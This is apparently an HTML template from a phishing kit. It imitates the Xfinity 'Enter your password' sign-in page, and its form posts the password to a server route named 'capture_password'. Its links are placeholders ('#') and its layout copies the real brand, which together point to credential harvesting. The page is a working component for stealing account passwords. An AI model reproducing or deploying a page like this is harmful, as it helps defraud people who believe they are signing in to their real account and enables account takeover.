<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter Password | xfinity</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --text: #111827;
      --muted: #6b7280;
      --purple: #6d28d9;
      --border: #d1d5db;
    }
    * { box-sizing: border-box; }
    body {
      margin:0;
      font-family: "Inter", system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
      display:flex;
      justify-content:center;
      align-items:flex-start;
      background:#fff;
      color:var(--text);
    }
    .container {
      width:100%;
      max-width:460px;
      margin-top:60px;
      padding:0 20px;
    }
    .brand {
      font-size:32px;
      color:#6b7280;
      margin-bottom:34px;
      font-weight:600;
    }
    h1 {
      font-size:28px;
      font-weight:700;
      margin:0 0 24px;
    }
    .input-wrap {
      position:relative;
      margin-bottom:16px;
    }
    input[type="password"],
    input[type="text"] {
      width:100%;
      height:56px;
      border:1px solid var(--border);
      border-radius:6px;
      padding:0 48px 0 14px;
      font-size:18px;
    }
    .toggle {
      position:absolute;
      right:14px;
      top:50%;
      transform:translateY(-50%);
      cursor:pointer;
      font-size:18px;
      color:#444;
    }
    .forgot {
      display:block;
      margin:10px 0 24px;
      font-size:15px;
      color:#6d28d9;
      font-weight:500;
      text-decoration:none;
    }
    .forgot:hover { text-decoration:underline; }
    .checkbox {
      display:flex;
      align-items:center;
      gap:10px;
      margin-bottom:24px;
      font-size:15px;
    }
    .checkbox input {
      width:18px;
      height:18px;
    }
    .terms {
      font-size:14px;
      color:var(--muted);
      margin-bottom:28px;
      line-height:1.5;
    }
    .terms a {
      color:#6d28d9;
      text-decoration:none;
      font-weight:500;
    }
    .terms a:hover { text-decoration:underline; }
    .btn {
      display:inline-block;
      width:100%;
      height:52px;
      background:#6d28d9;
      border:none;
      border-radius:6px;
      color:#fff;
      font-weight:600;
      font-size:18px;
      cursor:pointer;
      margin-bottom:26px;
    }
    .btn:hover { background:#5b21b6; }
    .alt {
      font-size:16px;
      font-weight:600;
      color:#111;
      text-decoration:none;
    }
    .alt:hover { text-decoration:underline; }
  </style>
</head>
<body>
  <div class="container">
    <div class="brand">xfinity</div>

    <h1>Enter your password</h1>

    <form action="{{ url_for('capture_password') }}" method="post">
      <div class="input-wrap">
        <input type="password" id="password" name="password" required>
        <span class="toggle" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>

      <a href="#" class="forgot">Forgot password?</a>

      <label class="checkbox">
        <input type="checkbox" name="remember">
        Keep me signed in
      </label>

      <div class="terms">
        By signing in, you agree to our
        <a href="#">Terms of Service</a> and
        <a href="#">Privacy Policy</a>.
      </div>

      <button class="btn" type="submit">Sign in</button>

      <a href="#" class="alt">Sign in as someone else</a>
    </form>
  </div>

  <script>
    function togglePassword() {
      const input = document.getElementById("password");
      input.type = input.type === "password" ? "text" : "password";
    }
  </script>
</body>
</html>
